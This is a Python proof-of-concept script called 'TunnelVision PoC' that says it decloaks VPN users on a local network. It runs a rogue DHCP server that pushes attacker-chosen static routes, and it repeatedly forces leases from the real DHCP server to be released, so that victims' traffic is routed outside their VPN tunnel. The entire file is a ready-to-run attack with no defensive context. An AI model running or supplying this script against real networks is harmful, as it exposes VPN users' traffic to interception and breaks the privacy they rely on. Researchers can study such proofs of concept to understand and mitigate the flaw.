#!/usr/bin/python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.runtime import RUNTIME
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent
import logging
import argparse


parser = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
parser.add_argument('-s', '--server', help="Interface to listen on", required=True)
parser.add_argument('-r', '--route', action='append', help="Route to add to table. May be listed more than once")
parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")

def main():
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPServerEvent.LEASE_OFFERED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(ARPTableEvent.ENTRY_CHANGED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPReleaseEvent.LEASE_RELEASED)

    interface = NetworkInterface(args.interface)
    server    = DHCPServer(interface, DHCPSubleaser(interface), classless_static_routes=args.route)
    releaser  = DHCPReleaser(interface, server.lease_generator, args.server, sweep_time=5)
    interface.thread.join()



if __name__ == "__main__":
    main()
